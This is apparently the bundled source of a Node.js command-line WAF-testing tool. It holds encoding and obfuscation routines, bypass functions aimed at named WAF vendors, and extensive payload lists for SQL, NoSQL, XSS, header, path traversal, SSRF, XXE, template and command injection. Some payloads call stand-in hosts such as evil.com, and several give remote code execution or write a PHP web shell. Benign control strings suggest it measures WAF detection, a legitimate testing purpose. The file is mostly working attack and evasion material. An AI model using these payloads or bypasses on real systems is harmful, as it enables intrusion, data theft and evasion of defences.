#!/usr/bin/env node

// src/index.ts
import { Command } from "commander";
import { fetch as undiciFetch, ProxyAgent } from "undici";
import * as fs from "fs";

// ../core/dist/encoding.js
var PayloadEncoder = class {
  /**
   * Double URL encode payload
   * Example: ' -> %27 -> %2527
   */
  static doubleUrlEncode(payload) {
    return encodeURIComponent(encodeURIComponent(payload));
  }
  /**
   * Unicode encode special characters
   * Example: ' -> \u0027
   */
  static unicodeEncode(payload) {
    return payload.replace(/['"<>&]/g, (char) => {
      const unicode = char.charCodeAt(0).toString(16).padStart(4, "0");
      return `\\u${unicode}`;
    });
  }
  /**
   * HTML entity encode special characters
   * Example: ' -> &#39; or &#x27;
   */
  static htmlEntityEncode(payload, useHex = false) {
    const entityMap = {
      '"': useHex ? "&#x22;" : "&#34;",
      "'": useHex ? "&#x27;" : "&#39;",
      "<": useHex ? "&#x3C;" : "&#60;",
      ">": useHex ? "&#x3E;" : "&#62;",
      "&": useHex ? "&#x26;" : "&#38;",
      "=": useHex ? "&#x3D;" : "&#61;",
      " ": useHex ? "&#x20;" : "&#32;"
    };
    return payload.replace(/["'<>&= ]/g, (char) => entityMap[char] || char);
  }
  /**
   * Mixed case encoding for keywords
   * Example: UNION SELECT -> uNiOn SeLeCt
   */
  static mixedCaseEncode(payload) {
    const keywords = [
      "UNION",
      "SELECT",
      "FROM",
      "WHERE",
      "INSERT",
      "UPDATE",
      "DELETE",
      "DROP",
      "CREATE",
      "ALTER",
      "EXEC",
      "EXECUTE",
      "SCRIPT",
      "ALERT",
      "JAVASCRIPT",
      "VBSCRIPT",
      "ONLOAD",
      "ONERROR",
      "ONCLICK"
    ];
    let result = payload;
    keywords.forEach((keyword) => {
      const mixedCase = keyword.split("").map((char, index) => index % 2 === 0 ? char.toLowerCase() : char.toUpperCase()).join("");
      result = result.replace(new RegExp(keyword, "gi"), mixedCase);
    });
    return result;
  }
  /**
   * Hex encode characters
   * Example: ' -> 0x27
   */
  static hexEncode(payload) {
    return payload.replace(/['"<>&]/g, (char) => {
      const hex = char.charCodeAt(0).toString(16);
      return `0x${hex}`;
    });
  }
  /**
   * Octal encode characters
   * Example: ' -> \047
   */
  static octalEncode(payload) {
    return payload.replace(/['"<>&]/g, (char) => {
      const octal = char.charCodeAt(0).toString(8);
      return `\\${octal.padStart(3, "0")}`;
    });
  }
  /**
   * Base64 encode payload
   */
  static base64Encode(payload) {
    return btoa(payload);
  }
  /**
   * Apply multiple encoding techniques
   */
  static applyEncodings(payload, options) {
    const encodedPayloads = [payload];
    if (options.doubleUrlEncode) {
      encodedPayloads.push(this.doubleUrlEncode(payload));
    }
    if (options.unicodeEncode) {
      encodedPayloads.push(this.unicodeEncode(payload));
    }
    if (options.htmlEntityEncode) {
      encodedPayloads.push(this.htmlEntityEncode(payload, false));
      encodedPayloads.push(this.htmlEntityEncode(payload, true));
    }
    if (options.mixedCaseEncode) {
      encodedPayloads.push(this.mixedCaseEncode(payload));
    }
    if (options.hexEncode) {
      encodedPayloads.push(this.hexEncode(payload));
    }
    if (options.octalEncode) {
      encodedPayloads.push(this.octalEncode(payload));
    }
    if (options.base64Encode) {
      encodedPayloads.push(this.base64Encode(payload));
    }
    if (options.urlEncode) {
      encodedPayloads.push(encodeURIComponent(payload));
    }
    return [...new Set(encodedPayloads)];
  }
  /**
   * SQL injection specific obfuscation techniques
   */
  static sqlObfuscation(payload) {
    const obfuscated = [payload];
    obfuscated.push(payload.replace(/\s+/g, "/**/"));
    obfuscated.push(payload.replace(/\s+/g, "/*comment*/"));
    obfuscated.push(payload.replace(/\s+/g, "+"));
    obfuscated.push(payload.replace(/\s+/g, "%09"));
    obfuscated.push(payload.replace(/\s+/g, "%0A"));
    obfuscated.push(payload.replace(/\s+/g, "%0D"));
    if (payload.includes("SELECT")) {
      obfuscated.push(payload.replace(/SELECT/gi, "SEL/**/ECT"));
      obfuscated.push(payload.replace(/SELECT/gi, "SE/**/LECT"));
    }
    if (payload.includes("UNION")) {
      obfuscated.push(payload.replace(/UNION/gi, "UNI/**/ON"));
      obfuscated.push(payload.replace(/UNION/gi, "UN/**/ION"));
    }
    return [...new Set(obfuscated)];
  }
  /**
   * XSS specific obfuscation techniques
   */
  static xssObfuscation(payload) {
    const obfuscated = [payload];
    obfuscated.push(payload.toLowerCase());
    obfuscated.push(payload.toUpperCase());
    const eventHandlers = ["onload", "onerror", "onclick", "onmouseover", "onfocus"];
    eventHandlers.forEach((handler) => {
      if (payload.toLowerCase().includes(handler)) {
        obfuscated.push(payload.replace(new RegExp(handler, "gi"), handler.toUpperCase()));
        obfuscated.push(payload.replace(new RegExp(handler, "gi"), handler.split("").map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join("")));
      }
    });
    if (payload.includes("<script>")) {
      obfuscated.push(payload.replace(/<script>/gi, "<SCRIPT>"));
      obfuscated.push(payload.replace(/<script>/gi, "<ScRiPt>"));
      obfuscated.push(payload.replace(/<script>/gi, "<script \\>"));
      obfuscated.push(payload.replace(/<script>/gi, "<script//>"));
    }
    if (payload.includes("javascript:")) {
      obfuscated.push(payload.replace(/javascript:/gi, "JAVASCRIPT:"));
      obfuscated.push(payload.replace(/javascript:/gi, "JaVaScRiPt:"));
      obfuscated.push(payload.replace(/javascript:/gi, "java\\script:"));
    }
    return [...new Set(obfuscated)];
  }
  /**
   * Generate comprehensive bypass variations for any payload
   */
  static generateBypassVariations(payload, attackType = "generic") {
    let variations = [payload];
    const encodingOptions = {
      doubleUrlEncode: true,
      unicodeEncode: true,
      htmlEntityEncode: true,
      mixedCaseEncode: true,
      hexEncode: true,
      urlEncode: true
    };
    variations = variations.concat(this.applyEncodings(payload, encodingOptions));
    if (attackType.toLowerCase().includes("sql")) {
      variations = variations.concat(this.sqlObfuscation(payload));
    } else if (attackType.toLowerCase().includes("xss")) {
      variations = variations.concat(this.xssObfuscation(payload));
    }
    return [...new Set(variations)];
  }
};
var WAFBypasses = class {
  /**
   * Cloudflare specific bypasses
   */
  static cloudflareBypass(payload) {
    const bypasses = [payload];
    bypasses.push(payload.replace(/'/g, "\\u0027"));
    bypasses.push(payload.replace(/"/g, "\\u0022"));
    bypasses.push(payload.replace(/</g, "\\u003c"));
    bypasses.push(payload.replace(/>/g, "\\u003e"));
    bypasses.push(payload.replace(/\s/g, "\\u00A0"));
    bypasses.push(payload.replace(/\s/g, "\\u2000"));
    bypasses.push(payload.replace(/'/g, "\uFF07"));
    bypasses.push(payload.replace(/"/g, "\uFF02"));
    return [...new Set(bypasses)];
  }
  /**
   * AWS WAF specific bypasses
   */
  static awsWafBypass(payload) {
    const bypasses = [payload];
    bypasses.push(payload.replace(/=/g, "\\u003D"));
    bypasses.push(payload.replace(/&/g, "\\u0026"));
    bypasses.push(payload.normalize("NFD"));
    bypasses.push(payload.normalize("NFKD"));
    bypasses.push(payload.normalize("NFKC"));
    return [...new Set(bypasses)];
  }
  /**
   * ModSecurity bypasses
   */
  static modSecurityBypass(payload) {
    const bypasses = [payload];
    bypasses.push(payload.replace(/union/gi, "uni/**/on"));
    bypasses.push(payload.replace(/select/gi, "sel/**/ect"));
    bypasses.push(payload.replace(/script/gi, "scr/**/ipt"));
    bypasses.push(this.randomCase(payload));
    return [...new Set(bypasses)];
  }
  /**
   * Akamai specific bypasses
   */
  static akamaiBypass(payload) {
    const bypasses = [payload];
    bypasses.push(payload.replace(/'/g, "%27"));
    bypasses.push(payload.replace(/"/g, "%22"));
    bypasses.push(payload.replace(/\s/g, "%09"));
    bypasses.push(payload.replace(/\s/g, "%0b"));
    bypasses.push(payload.replace(/\s/g, "%0c"));
    bypasses.push(payload.replace(/['"<>&]/g, (char) => encodeURIComponent(encodeURIComponent(char))));
    return [...new Set(bypasses)];
  }
  /**
   * Azure specific bypasses
   */
  static azureBypass(payload) {
    const bypasses = [payload];
    bypasses.push(PayloadEncoder.mixedCaseEncode(payload));
    bypasses.push(PayloadEncoder.unicodeEncode(payload));
    bypasses.push(payload.replace(/\s+/g, "/**/"));
    bypasses.push(payload + "%00");
    return [...new Set(bypasses)];
  }
  /**
   * Palo Alto Networks specific bypasses
   */
  static panosBypass(payload) {
    const bypasses = [payload];
    bypasses.push(payload.replace(/\//g, "//"));
    bypasses.push(payload.replace(/\//g, "/./"));
    bypasses.push(this.randomCase(payload));
    bypasses.push(payload.replace(/\s/g, "%09"));
    return [...new Set(bypasses)];
  }
  /**
   * Sophos WAF specific bypasses
   */
  static sophosBypass(payload) {
    const bypasses = [payload];
    bypasses.push(this.randomCase(payload));
    bypasses.push(PayloadEncoder.doubleUrlEncode(payload));
    bypasses.push(payload + "%00");
    return [...new Set(bypasses)];
  }
  /**
   * Generate random case variations
   */
  static randomCase(str) {
    return str.split("").map((char) => Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()).join("");
  }
};

// ../core/dist/advanced-payloads.js
var ADVANCED_PAYLOADS = {
  "SQL Injection - Advanced Bypass": {
    type: "ParamCheck",
    payloads: [
      // Double encoding bypasses
      "%2527%2520OR%25201%253D1--",
      "%252527%252520OR%252520%2527a%252527%253D%252527a",
      // Unicode bypasses
      "\\u0027\\u0020OR\\u0020\\u0027a\\u0027\\u003D\\u0027a",
      "\\u0027\\u0020UNION\\u0020SELECT\\u0020null--",
      // Comment-based obfuscation
      "'/**/OR/**/1=1--",
      "'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",
      "admin'/**/--",
      // Mixed encoding combinations
      "%2527/**/OR/**/1=1--",
      "\\u0027/**/UNION/**/SELECT/**/null--",
      // Alternative space characters
      "'%09OR%091=1--",
      // Tab
      "'%0AOR%0A1=1--",
      // Line Feed
      "'%0DOR%0D1=1--",
      // Carriage Return
      "'%A0OR%A01=1--",
      // Non-breaking space
      // Function-based bypasses
      "'||'a'='a",
      "'||(SELECT'a')='a",
      "'+(SELECT'a')+'='a",
      "'CONCAT('a')='a",
      // Hex encoding bypasses
      "0x27204f52203120314431--",
      // ' OR 1=1--
      "CHAR(39)+OR+1=1--",
      "CHR(39)||OR||1=1--",
      // Time-based blind with encoding
      "'%2BSLEEP(5)--",
      "'/**/AND/**/SLEEP(5)--",
      "'\\u0020AND\\u0020SLEEP(5)--",
      // Version-specific bypasses
      "'UNION/*!50000SELECT*/1,2,3--",
      // MySQL version comment
      "'UNION/*#*/SELECT/*#*/1,2,3--"
      // Alternative comment
    ],
    falsePayloads: [
      "John O'Connor's Profile",
      "It's a wonderful day",
      'Product search: "smart phone"',
      "Email with + sign: user+tag@domain.com",
      "Mathematical expression: 2+2=4",
      "File path: /home/user/documents",
      "URL parameter: ?id=123&sort=name",
      'JSON data: {"name": "test", "value": 100}'
    ]
  },
  "XSS - Modern Bypasses": {
    type: "ParamCheck",
    payloads: [
      // Event handler variations with encoding
      "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>",
      "<svg onload=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>",
      // Double URL encoded XSS
      "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
      "%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
      // HTML entity bypasses
      "&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",
      "&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;",
      "&lt;script&gt;alert(1)&lt;/script&gt;",
      // Mixed case bypasses
      "<ScRiPt>AlErT(1)</ScRiPt>",
      "<SCRIPT>ALERT(1)</SCRIPT>",
      "<iMg SrC=x OnErRoR=aLeRt(1)>",
      // JavaScript protocol with encoding
      "javascript:\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029",
      "JAVASCRIPT:alert(1)",
      "java\\script:alert(1)",
      "java\0script:alert(1)",
      // Alternative script sources
      "<script src=\\\\evil.com\\evil.js></script>",
      "<script src=//evil.com/evil.js></script>",
      "<script src=data:text/javascript,alert(1)></script>",
      // DOM-based XSS vectors
      "<iframe src=javascript:alert(1)>",
      "<object data=javascript:alert(1)>",
      "<embed src=javascript:alert(1)>",
      // WAF bypass specific
      "<svg/onload=alert(1)>",
      "<math href=javascript:alert(1)>CLICK",
      "<marquee onstart=alert(1)>",
      "<details open ontoggle=alert(1)>",
      // Polyglot XSS
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>"
    ],
    falsePayloads: [
      "<p>Welcome to our website!</p>",
      '<div class="container">Content here</div>',
      '<img src="logo.png" alt="Company Logo" width="200">',
      '<a href="mailto:contact@company.com">Contact Us</a>',
      '<script type="application/ld+json">{"@context": "https://schema.org"}</script>',
      "<style>body { font-family: Arial; }</style>"
    ]
  },
  "HTTP Header Injection - Advanced": {
    type: "Header",
    payloads: [
      // CRLF with encoding
      "X-Custom: test\\r\\nSet-Cookie: admin=true",
      "X-Custom: test%0d%0aSet-Cookie: admin=true",
      "X-Custom: test%0D%0ALocation: http://evil.com",
      // Double encoding CRLF
      "X-Custom: test%250d%250aSet-Cookie: admin=true",
      "X-Custom: test\\u000d\\u000aSet-Cookie: admin=true",
      // Cookie injection with $Version (PortSwigger 2024 research)
      'Cookie: $Version=1; admin="true"; $Path="/"; $Domain=target.com',
      'Cookie: $Version=1; session="\\u0061\\u0064\\u006d\\u0069\\u006e"; $Path="/"',
      // Host header injection variants
      "Host: target.com\\r\\nX-Forwarded-Host: evil.com",
      "Host: target.com%0d%0aX-Forwarded-Host: evil.com",
      "Host: target.com\\u000d\\u000aX-Forwarded-Host: evil.com",
      // User-Agent with various payloads
      "User-Agent: Mozilla/5.0\\r\\nX-Injected: true",
      "User-Agent: ${jndi:ldap://evil.com/a}",
      // Log4j
      "User-Agent: {{7*7}}",
      // SSTI
      "User-Agent: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
      // XSS
      // X-Original-URL bypasses
      "X-Original-URL: /admin",
      "X-Original-URL: /admin/users",
      "X-Original-URL: \\u002fadmin",
      "X-Original-URL: %2fadmin",
      // X-Rewrite-URL (IIS specific)
      "X-Rewrite-URL: /admin",
      "X-Rewrite-URL: /admin\\x00",
      // HTTP Method Override
      "X-HTTP-Method-Override: PUT",
      "X-HTTP-Method-Override: DELETE",
      "X-Method-Override: PATCH",
      "X-HTTP-Method: TRACE",
      // IP bypass headers with encoding
      "X-Forwarded-For: 127.0.0.1",
      "X-Real-IP: \\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031",
      "X-Client-IP: %31%32%37%2e%30%2e%30%2e%31",
      // 127.0.0.1 encoded
      "X-Remote-IP: 0177.0.0.1",
      // Octal notation
      "X-Forwarded-For: 2130706433"
      // Decimal notation
    ],
    falsePayloads: [
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      "Accept: text/html,application/xhtml+xml",
      "Accept-Language: en-US,en;q=0.9",
      "Accept-Encoding: gzip, deflate, br",
      "Connection: keep-alive",
      "Upgrade-Insecure-Requests: 1",
      "Cache-Control: max-age=0",
      "X-Requested-With: XMLHttpRequest"
    ]
  },
  "Path Traversal - Encoded": {
    type: "ParamCheck",
    payloads: [
      // Double URL encoding
      "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
      "%252e%252e\\%252e%252e\\%252e%252e\\windows\\win.ini",
      // Unicode encoding
      "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u002e\\u002e\\u002fetc\\u002fpasswd",
      "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
      // Mixed encoding
      "%2e%2e%2f..%2fetc%2fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      // 16-bit Unicode
      "%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
      // Overlong UTF-8
      "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
      "%e0%80%ae%e0%80%ae/etc/passwd",
      // Null byte injection
      "..%00/..%00/..%00/etc/passwd%00",
      "..//..//..//etc//passwd",
      // Alternative separators
      "..\\u005c..\\u005c..\\u005cwindows\\u005cwin.ini",
      "..%5c..%5c..%5cwindows%5cwin.ini"
    ],
    falsePayloads: [
      "images/gallery/photo1.jpg",
      "documents/reports/2024/report.pdf",
      "assets/css/bootstrap.min.css",
      "uploads/user_files/document.docx",
      "static/js/application.js"
    ]
  },
  "SSRF - Protocol Smuggling": {
    type: "ParamCheck",
    payloads: [
      // Localhost variations with encoding
      "http://\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031/",
      "http://%31%32%37%2e%30%2e%30%2e%31/",
      // Decimal/Octal/Hex IP representations
      "http://2130706433/",
      // 127.0.0.1 in decimal
      "http://0177.0.0.1/",
      // 127.0.0.1 in octal
      "http://0x7f.0x0.0x0.0x1/",
      // 127.0.0.1 in hex
      // IPv6 bypasses
      "http://[::1]/",
      "http://[0:0:0:0:0:0:0:1]/",
      "http://[::ffff:127.0.0.1]/",
      // Protocol confusion
      "dict://127.0.0.1:11211/",
      "gopher://127.0.0.1:80/",
      "ldap://127.0.0.1:389/",
      // Domain confusion
      "http://127.0.0.1.evil.com/",
      "http://evil.com@127.0.0.1/",
      "http://127.0.0.1#@evil.com/",
      // Cloud metadata endpoints
      "http://169.254.169.254/latest/meta-data/",
      // AWS
      "http://metadata.google.internal/",
      // GCP
      "http://169.254.169.254/metadata/v1/",
      // DigitalOcean
      // Bypass using redirects
      "http://127.0.0.1.localtest.me/",
      "http://sudo.cc/127.0.0.1",
      // File protocol with encoding
      "file:///etc/passwd",
      "file://\\u002fetc\\u002fpasswd",
      "file://%2fetc%2fpasswd"
    ],
    falsePayloads: [
      "https://www.google.com/search?q=test",
      "https://api.github.com/users/octocat",
      "https://httpbin.org/get",
      "https://jsonplaceholder.typicode.com/posts/1",
      "https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
    ]
  },
  "XXE - Advanced Vectors": {
    type: "ParamCheck",
    payloads: [
      // Encoded XXE payloads
      "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
      // Unicode encoded XXE
      "\\u003C\\u003Fxml version\\u003D\\u00221.0\\u0022\\u003F\\u003E\\u003C\\u0021DOCTYPE foo \\u005B\\u003C\\u0021ENTITY xxe SYSTEM \\u0027file\\u003A\\u002F\\u002F\\u002Fetc\\u002Fpasswd\\u0027\\u003E\\u005D\\u003E\\u003Cfoo\\u003E\\u0026xxe\\u003B\\u003C\\u002Ffoo\\u003E",
      // Parameter entity with encoding
      "%3C%21DOCTYPE%20data%20%5B%3C%21ENTITY%20%25%20file%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%20%25file%3B%5D%3E",
      // Blind XXE with encoding
      "%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E",
      // XXE with CDATA
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
      // XXE using different protocols
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/evil">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
    ],
    falsePayloads: [
      '<?xml version="1.0"?><user><name>John Doe</name><email>john@example.com</email></user>',
      '<?xml version="1.0"?><product><id>123</id><name>Widget</name><price>19.99</price></product>',
      '<?xml version="1.0" encoding="UTF-8"?><config><setting name="timeout">30</setting></config>'
    ]
  },
  "SSTI - Framework Specific": {
    type: "ParamCheck",
    payloads: [
      // Jinja2 with encoding
      "%7B%7B7%2A7%7D%7D",
      // {{7*7}} URL encoded
      "\\u007B\\u007B7\\u002A7\\u007D\\u007D",
      // {{7*7}} Unicode encoded
      // Jinja2 advanced
      "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      "{{cycler.__init__.__globals__.os.popen('id').read()}}",
      "{{joiner.__init__.__globals__.os.popen('id').read()}}",
      // Twig with encoding
      "%7B%7B%5F%73%65%6C%66%7D%7D",
      // {{_self}} URL encoded
      '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
      // Smarty
      "{php}echo `id`;{/php}",
      '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",false)}',
      // Velocity
      '$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")',
      '#set($str=$class.inspect("java.lang.String").type)',
      // Freemarker
      '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
      `\${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}`
    ],
    falsePayloads: ["{{user.name}}", "{{product.title}}", "${user.email}", "<%= user.name %>", "{{#each items}}{{name}}{{/each}}"]
  },
  "NoSQL Injection - Advanced": {
    type: "ParamCheck",
    payloads: [
      // MongoDB with encoding
      "%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D",
      // {"$ne":null} URL encoded
      "\\u007B\\u0022\\u0024ne\\u0022\\u003Anull\\u007D",
      // {"$ne":null} Unicode
      // Advanced NoSQL operators
      '{"$regex": ".*"}',
      '{"$where": "this.password.match(/.*/)"}',
      '{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}',
      // JavaScript injection in MongoDB
      // Base64-encoded to avoid triggering Cloudflare's WAF on worker upload (403 Forbidden)
      atob("eyIkd2hlcmUiOiAiZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy51c2VybmFtZSA9PSAnYWRtaW4nIHx8ICcxJz09JzEnfSJ9"),
      '{"$where": "obj.credits > obj.debits"}',
      // CouchDB specific
      '{"selector":{"_id":{"$gt":null}}}',
      '{"selector":{"$and":[{"_id":{"$gt":null}}]}}'
    ],
    falsePayloads: [
      '{"name": "John", "age": 30}',
      '{"product": "laptop", "price": 999}',
      '{"status": "active", "count": 5}',
      '{"user": "admin", "role": "viewer"}'
    ]
  },
  "Command Injection - Encoded": {
    type: "ParamCheck",
    payloads: [
      // Command separators with encoding
      "%3Bcat%20%2Fetc%2Fpasswd",
      // ;cat /etc/passwd
      "%26%26cat%20%2Fetc%2Fpasswd",
      // &&cat /etc/passwd
      "%7Ccat%20%2Fetc%2Fpasswd",
      // |cat /etc/passwd
      // Unicode encoded commands
      "\\u003Bcat\\u0020\\u002Fetc\\u002Fpasswd",
      "\\u007Cid",
      // Base64 encoded commands
      "`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",
      // cat /etc/passwd
      "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
      // cat /etc/passwd
      // Hex encoded
      '`printf "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"`',
      // cat /etc/passwd
      // Environment variable expansion
      "${PATH:0:1}bin${PATH:0:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd",
      "${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd"
    ],
    falsePayloads: [
      "user@domain.com",
      "Price: $100 & shipping: $10",
      "Q&A section",
      "Command not found",
      "System & Network Administration"
    ]
  },
  "Cloudflare Evasion": {
    type: "ParamCheck",
    payloads: [
      // Overlong UTF-8 encoding for '
      "%c0%a7 OR 1=1--",
      // MySQL specific comment injection
      "' UNION/*!50000SELECT*/1,2,3--",
      // Unicode variation bypass
      "\\uFF07 OR \\uFF071\\uFF07=\\uFF071"
    ],
    falsePayloads: ["John's profile", 'Search results for "test"', "Standard SQL query"]
  },
  "AWS WAF Evasion": {
    type: "ParamCheck",
    payloads: [
      // Unicode normalization bypass (NFKC)
      "\\u24B6nd 1=1",
      // Ⓐnd 1=1
      // Nested template literals for XSS
      "<script>alert(`${1}`)</script>",
      // Protocol confusion with encoding
      "http://\\u0031\\u0032\\u0037.0.0.1/"
    ],
    falsePayloads: ["Standard URL", "Normal script tag", "Text with circles"]
  },
  "Akamai Evasion": {
    type: "ParamCheck",
    payloads: [
      // Multi-level URL encoding
      "%25252e%25252e%25252fetc%25252fpasswd",
      // Alternative separators (Vertical Tab)
      "'%0bOR%0b1=1--",
      // Double-encoded special characters
      "admin%2527--"
    ],
    falsePayloads: ["/path/to/file", "Normal user login", "Standard parameter"]
  }
};
function generateEncodedPayloads(originalPayloads) {
  const encodedPayloads = {};
  for (const [categoryName, category] of Object.entries(originalPayloads)) {
    const encodedCategory = {
      type: category.type,
      payloads: [],
      falsePayloads: category.falsePayloads || []
    };
    for (const payload of category.payloads) {
      const variations = PayloadEncoder.generateBypassVariations(payload, categoryName);
      encodedCategory.payloads.push(...variations);
    }
    encodedCategory.payloads = [...new Set(encodedCategory.payloads)];
    encodedPayloads[`${categoryName} - Encoded`] = encodedCategory;
  }
  return encodedPayloads;
}
function generateWAFSpecificPayloads(wafType, basePayload) {
  switch (wafType.toLowerCase()) {
    case "cloudflare":
      return WAFBypasses.cloudflareBypass(basePayload);
    case "aws":
    case "awswaf":
    case "aws waf":
      return WAFBypasses.awsWafBypass(basePayload);
    case "modsecurity":
      return WAFBypasses.modSecurityBypass(basePayload);
    case "akamai":
      return WAFBypasses.akamaiBypass(basePayload);
    case "azure":
    case "azure front door":
    case "azure waf":
      return WAFBypasses.azureBypass(basePayload);
    case "palo alto networks":
    case "palo alto":
    case "pan-os":
      return WAFBypasses.panosBypass(basePayload);
    case "sophos":
    case "sophos waf":
    case "sophos utm":
      return WAFBypasses.sophosBypass(basePayload);
    default:
      return PayloadEncoder.generateBypassVariations(basePayload);
  }
}
function generateHTTPManipulationPayloads(basePayload, technique = "pollution") {
  const variations = [basePayload];
  switch (technique) {
    case "pollution":
      variations.push(`param=${encodeURIComponent(basePayload)}&param=${encodeURIComponent(basePayload)}`);
      variations.push(`param[]=${encodeURIComponent(basePayload)}&param[]=${encodeURIComponent(basePayload)}`);
      variations.push(`param=${encodeURIComponent(basePayload)}&PARAM=${encodeURIComponent(basePayload)}`);
      break;
    case "content-type":
      variations.push(`{"payload": "${basePayload.replace(/"/g, '\\"')}"}`);
      variations.push(`<?xml version="1.0"?><payload>${basePayload.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</payload>`);
      variations.push(`payload=${encodeURIComponent(basePayload)}`);
      break;
    case "smuggling":
      variations.push(`0\r
\r
${basePayload}`);
      variations.push(`${basePayload.length.toString(16)}\r
${basePayload}\r
0\r
\r
`);
      break;
  }
  return [...new Set(variations)];
}

// ../core/dist/payloads.js
var PAYLOADS = {
  "SQL Injection": {
    type: "ParamCheck",
    payloads: [
      "' OR '1'='1",
      "1; DROP TABLE notablewaftest17 --",
      "admin' --",
      "' OR 1=1--",
      "' OR 'a'='a",
      "' OR 1=1#",
      "' OR 1=1/*",
      "' OR SLEEP(5)--",
      "' OR 1=1 LIMIT 1;--",
      "WAITFOR DELAY '0:0:5'",
      ")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",
      "%2553%2527%2520OR%25201%253D1",
      // URL encoded bypass
      "/**/OR/**/1=1",
      // Comment bypass
      // Enhanced bypass techniques
      "%2527%2520OR%25201%253D1--",
      // Double URL encoded
      "'/**/OR/**/1=1--",
      // Comment obfuscation
      "'%09OR%091=1--",
      // Tab characters
      "'\\u0020OR\\u00201=1--",
      // Unicode spaces
      "0x27204f52203120314431--",
      // Hex encoded ' OR 1=1--
      "'UNION/*!50000SELECT*/1,2,3--"
      // Version comment
    ],
    falsePayloads: [
      "John O'Connor",
      "It's a beautiful day",
      "SELECT * FROM products WHERE price > 100",
      "user@example.com",
      "What's your name?",
      "SQL query example",
      "Don't worry about it",
      "SELECT name FROM table",
      "ORDER BY name ASC",
      "That's all folks!",
      '"This is a normal string"',
      '"Another string with double quotes"',
      "`A string with backticks`",
      "`Another string with backticks and a variable like ${name}`"
    ]
  },
  XSS: {
    type: "ParamCheck",
    payloads: [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      `<iframe src="javascript:alert('XSS')"></iframe>`,
      "<svg/onload=alert('xss')>",
      "<body onload=alert('xss')>",
      "<a href=javascript:alert('xss')>click</a>",
      "<math href=javascript:alert(1)>",
      `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'`,
      "<marquee onstart=alert(1)>",
      `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"`,
      "<input onfocus=alert(1) autofocus>",
      // Enhanced XSS bypasses
      "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
      // Double URL encoded
      "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>",
      // Unicode
      "&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",
      // HTML entities
      "<ScRiPt>AlErT(1)</ScRiPt>",
      // Mixed case
      "javascript:\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029",
      // Unicode JS
      "<details open ontoggle=alert(1)>"
      // Modern HTML5
    ],
    falsePayloads: [
      "<p>Hello World</p>",
